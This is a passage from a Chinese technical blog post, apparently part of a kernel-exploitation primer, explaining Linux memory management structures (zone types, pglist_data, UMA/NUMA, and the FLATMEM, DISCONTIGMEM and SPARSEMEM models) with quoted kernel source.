<p><code>zone</code> 经常会被访问到，因此这个数据结构要求以 L1 高速缓存对齐。另外，这里的 <code>ZONE PADDING()</code> 让 <code>zone-&gt;lock</code> 和 <code>zone-&gt;lru_lock</code> 这两个很热门的锁可以分布在不同的高速缓存行中。一个内存节点最多有几个 <code>zone</code> ，因此 <code>zone</code> 数据结构不需要像 <code>page</code> 一样关注数据结构的大小，<code>ZONE_PADDING()</code> 可以为了性能而浪费空间。在内存管理开发过程中，内核开发者逐步发现有一些自旋锁会竞争得非常厉害，很难获取。在稍微早期的Linux内核（如Linux4.0）中，<code>zone-&gt;lock</code> 和 <code>zone-&gt;lru_lock</code> 这两个锁有时需要同时获取，因此保证它们使用不同的高速缓存行是内核常用的一种优化技巧。然而，在Linux 5.0内核中，<code>zone-&gt;lru_lock</code> 已经转移到内存节点的 <code>pglist_data</code> 数据结构中。</p>
<hr>
<p>通常情况下，内核的 <code>zone</code> 分为 <code>ZONE_DMA</code>、<code>ZONE_DMA32</code>、<code>ZONE NORMAL</code> 和 <code>ZONE_HIGHMEM</code> 。<code>zone</code> 类型定义在 <code>include/linux/mmzone.h</code> 文件中。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * ZONE_DMA is used when there are devices that are not able</span></span><br><span class="line"><span class="comment">	 * to do DMA to all of addressable memory (ZONE_NORMAL). Then we</span></span><br><span class="line"><span class="comment">	 * carve out the portion of memory that is needed for these devices.</span></span><br><span class="line"><span class="comment">	 * The range is arch specific.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Some examples</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Architecture		Limit</span></span><br><span class="line"><span class="comment">	 * ---------------------------</span></span><br><span class="line"><span class="comment">	 * parisc, ia64, sparc	&lt;4G</span></span><br><span class="line"><span class="comment">	 * s390, powerpc	&lt;2G</span></span><br><span class="line"><span class="comment">	 * arm			Various</span></span><br><span class="line"><span class="comment">	 * alpha		Unlimited or 0-16MB.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * i386, x86_64 and multiple other arches</span></span><br><span class="line"><span class="comment">	 * 			&lt;16M.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ZONE_DMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * x86_64 needs two ZONE_DMAs because it supports devices that are</span></span><br><span class="line"><span class="comment">	 * only able to do DMA to the lower 16M but also 32 bit devices that</span></span><br><span class="line"><span class="comment">	 * can only do DMA areas below 4G.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ZONE_DMA32,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span></span><br><span class="line"><span class="comment">	 * performed on pages in ZONE_NORMAL if the DMA devices support</span></span><br><span class="line"><span class="comment">	 * transfers to all addressable memory.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ZONE_NORMAL,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A memory area that is only addressable by the kernel through</span></span><br><span class="line"><span class="comment">	 * mapping portions into its own address space. This is for example</span></span><br><span class="line"><span class="comment">	 * used by i386 to allow the kernel to address the memory beyond</span></span><br><span class="line"><span class="comment">	 * 900MB. The kernel will set up special mappings (page</span></span><br><span class="line"><span class="comment">	 * table entries on i386) for each page that the kernel needs to</span></span><br><span class="line"><span class="comment">	 * access.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	ZONE_HIGHMEM,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	ZONE_MOVABLE,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DEVICE</span></span><br><span class="line">	ZONE_DEVICE,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	__MAX_NR_ZONES</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>ZONE_DMA</code>：用于 ISA 设备的 DMA 操作，范围是 0~16MB ，只适用于Intel x86 架构，ARM 架构没有这个内存管理区。</li>
<li><code>ZONE_DMA32</code>：用于最低 4GB 的内存访问的设备，如只支持 32 位的 DMA 设备。</li>
<li><code>ZONE_NORMAL</code>：4GB 以后的物理内存，用于线性映射物理内存。若系统内存小于 4GB，则没有这个内存管理区。</li>
<li><code>ZONE_HIGHMEM</code>：用于管理高端内存，这些高端内存是不能线性映射到内核地址空间的。注意，在 64 位Linux操作系统中没有这个内存管理区。</li>
</ul>
<h4 id="pglist-data"><a href="#pglist-data" class="headerlink" title="pglist_data"></a>pglist_data</h4><p><code>pglist_data</code> 数据结构用来描述一个内存节点的所有资源。在 UMA 架构中，只有一个内存节点，即系统有一个全局的变量 <code>contig_page_data</code> 来描述这个内存节点。在 NUMA 架构中，整个系统的内存由一个 <code>pglist_data *</code> 的指针数组 <code>node_data[]</code> 来管理，在系统初始化时通过枚举 BIOS 固件（ACPI）来完成。<code>pglist_data</code> 结构定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    * 字段包含该节点所拥有的 zones。 并非所有的 zone 都已被填充，但这是一个满的列表。</span></span><br><span class="line"><span class="comment">    * 它被该节点的 node_zonelists 以及其他节点的 node_zonelists 所引用.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line">    <span class="comment">/* 用于 buddy system 分配内存。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line">    <span class="comment">/* 内存区域数量。 */</span></span><br><span class="line">	<span class="type">int</span> nr_zones;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP	<span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">    <span class="comment">/* 页描述符，除了稀疏内存模型外都使用。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="comment">/* 页的扩展属性。 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Must be held any time you expect node_start_pfn,</span></span><br><span class="line"><span class="comment">	 * node_present_pages, node_spanned_pages or nr_zones to stay constant.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment">	 * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">	 * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*  起始物理页号。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">    <span class="comment">/* 物理页总数（不包括空洞）。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* total number of physical pages */</span></span><br><span class="line">    <span class="comment">/* 物理页总数（包括空洞）。 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* total size of physical page range, including holes */</span></span><br><span class="line">	<span class="comment">/* 节点标识符。 */</span></span><br><span class="line">    <span class="type">int</span> node_id;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>	<span class="comment">/* Protected by</span></span><br><span class="line"><span class="comment">					   mem_hotplug_begin/end() */</span></span><br><span class="line">	<span class="type">int</span> kswapd_order;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_classzone_idx</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> kswapd_failures;		<span class="comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">	<span class="type">int</span> kcompactd_max_order;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_classzone_idx</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This is a per-node reserve of pages that are not available</span></span><br><span class="line"><span class="comment">	 * to userspace allocations.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * zone reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		min_unmapped_pages;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line">	ZONE_PADDING(_pad1_)</span><br><span class="line">	<span class="type">spinlock_t</span>		lru_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment">	 * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">	<span class="type">spinlock_t</span> split_queue_lock;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">split_queue</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> split_queue_len;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>		<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		flags;</span><br><span class="line"></span><br><span class="line">	ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Per-node vmstats */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>		vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure></div>

<h3 id="内存架构"><a href="#内存架构" class="headerlink" title="内存架构"></a>内存架构</h3><h4 id="UMA"><a href="#UMA" class="headerlink" title="UMA"></a>UMA</h4><p>UMA（Uniform Memory Access）架构指的是内存有统一的结构并且可以统一寻址。又名 Symmetrical  Multi-Processing，简称SMP，即对称多处理技术，SMP 对称多处理系统内有许多紧耦合多处理器，在这样的系统中，所有的CPU共享全部资源，如总线，内存和I&#x2F;O系统等，操作系统或管理数据库的复本只有一个，这种系统有一个最大的特点就是共享所有资源。多个CPU之间没有区别，平等地访问内存、外设、一个操作系统。操作系统管理着一个队列，每个处理器依次处理队列中的进程。如果两个处理器同时请求访问一个资源（例如同一段内存地址），由硬件、软件的锁机制去解决资源争用问题。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/uma.png"
                      alt="uma"
                ></p>
<h4 id="NUMA"><a href="#NUMA" class="headerlink" title="NUMA"></a>NUMA</h4><p>NUMA（Non-Uniform Memory Access）架构指的是系统中有多个节点和多个簇，CPU访问本地内存节点的速度最快，访问远端的内存节点的速度要慢一些。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/numa.png"
                      alt="numa"
                ></p>
<h3 id="内存模型"><a href="#内存模型" class="headerlink" title="内存模型"></a>内存模型</h3><p><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/452891440" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Linux 提供了三种内存模型，分别是FLATMEM、DISCONTIGMEM、SPARSEMEM。定义于 <code>include/asm-generic/memory_model.h</code> 中。Linux当前默认使用SPARSEMEM模型。</p>
<h4 id="FLATMEM"><a href="#FLATMEM" class="headerlink" title="FLATMEM"></a>FLATMEM</h4><p>平滑内存模型。物理内存地址连续，通过简单的线性映射将物理内存页与一个数组 mem_map 对应起来。如下图的模型所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/flatmem.webp"
                      alt="flatmem"
                ></p>
<p>从图中可以看出，使用FLATMEM的模型非常高效和简单，直接将物理页通过线性映射与mem_map对应起来。但这种模型有个致命的问题，就是在存在大量空洞内存的场景下，mem_map数组可能会很大，造成内存浪费。</p>
<h4 id="DISCONTIGMEM"><a href="#DISCONTIGMEM" class="headerlink" title="DISCONTIGMEM"></a>DISCONTIGMEM</h4><p>为了解决不连续内存（NUMA架构）造成的内存浪费问题，Linux在1999年引入了一种新的内存模型，这就是DISCONTIGMEM。其是通过编译的时候设置CONFIG_DISCONTIGMEM配置项来开启的。针对FLATMEM模型在不连续内存带来的浪费，DISCONTIGMEM的解决思路也挺简单的，就是每个不连续的node都维护一个mem_map，而不是使用一个全局的mem_map，这样就避免mem_map有大量的空洞地址映射。具体模型参考下图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/DISCONTIGMEM.webp"
                      alt="DISCONTIGMEM"
                ></p>
<p>对于每一段连续的物理内存，都有一个 <code>pglist_data</code> 结构体进行对应，其成员 <code>node_mem_map</code> 为一个 <code>struct page</code> 指针，指向一个 <code>page</code> 结构体数组，由该结构体对应到该段连续物理内存。有一个全局变量 <code>node_data</code> 为一个 <code>pglist_data</code> 数组，其中存放着指向每一个 <code>pglist_data</code> ，该数组的大小为 <code>MAX_NUMNODES</code> 。</p>
<h4 id="SPARSEMEM"><a href="#SPARSEMEM" class="headerlink" title="SPARSEMEM"></a>SPARSEMEM</h4><p>DISCONTIGMEM模型同样存在不小的弊端：紧凑型线性映射和不支持内存热拔插。DISCONTIGMEM模型本质是一个node上的FLATMEM，随着node的增加或者内存热拔插长场景的出现，同一个node内，也可能出现大量不连续内存，导致DISCONTIGMEM模型开销越来越大。这时候，一个全新的稀松内存模型(sparse memory model)被引入到内核中。下面是其模型图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/SPARSEMEM.webp"
                      alt="SPARSEMEM"
                ></p>
<p>在一个 <code>mem_section</code> 结构体中存在一个 <code>section_mem_map</code> 成员指向一个 <code>struct page</code> 数组对应一段连续的物理内存，即将内存按照 <code>section</code> 为单位进行分段。存在一个全局指针数组 <code>mem_section</code> （与结构体同名）存放所有的 <code>mem_section</code> 指针，指向理论上支持的内存空间，每个 <code>section</code> 对应的物理内存不一定存在，若不存在则此时该 <code>section</code> 的指针为 NULL 。</p>
<h4 id="SPARSEMEM-数据结构"><a href="#SPARSEMEM-数据结构" class="headerlink" title="SPARSEMEM 数据结构"></a>SPARSEMEM 数据结构</h4><p> <code>mem_section</code> 结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This is, logically, a pointer to an array of struct</span></span><br><span class="line"><span class="comment">	 * pages.  However, it is stored with some other magic.</span></span><br><span class="line"><span class="comment">	 * (see sparse.c::sparse_init_one_section())</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Additionally during early boot we encode node id of</span></span><br><span class="line"><span class="comment">	 * the location of the section here to guide allocation.</span></span><br><span class="line"><span class="comment">	 * (see sparse.c::memory_present())</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Making it a UL at least makes someone do a cast</span></span><br><span class="line"><span class="comment">	 * before using it wrong.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> section_mem_map;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* See declaration of similar field in struct zone */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> *pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If SPARSEMEM, pgdat doesn&#x27;t have page_ext pointer. We use</span></span><br><span class="line"><span class="comment">	 * section. (see page_ext.h about this.)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">page_ext</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> pad;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * WARNING: mem_section must be a power-of-2 in size for the</span></span><br><span class="line"><span class="comment">	 * calculation and use of SECTION_ROOT_MASK to make sense.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>mem_section</code> 变量定义于 <code>/mm/sparse.c</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> **<span class="title">mem_section</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> <span class="title">mem_section</span>[<span class="title">NR_SECTION_ROOTS</span>][<span class="title">SECTIONS_PER_ROOT</span>]</span></span><br><span class="line"><span class="class">	____<span class="title">cacheline_internodealigned_in_smp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>若未开启 <code>CONFIG_SPARSEMEM_EXTREME</code> 编译选项则 <code>mem_section</code> 为一个常规的二维数组，否则为一个二级指针，其所指向空间内存动态分配。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/mem_section.png"
                      alt="mem_section"
                ></p>
<p>kernel 中提供了两个用以在 PFN（Page Frame Numer） 与 <code>page</code> 结构体之间进行转换的宏，定义于 <code>/include/asm-generic/memory_model.h</code> 中，如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">nr_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">nr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line">	<span class="keyword">if</span> (!mem_section)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (!mem_section[SECTION_NR_TO_ROOT(nr)])</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> &amp;mem_section[SECTION_NR_TO_ROOT(nr)][nr &amp; SECTION_ROOT_MASK];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">pfn_to_section_nr</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> pfn)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> pfn &gt;&gt; PFN_SECTION_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">page_to_section</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> (page-&gt;flags &gt;&gt; 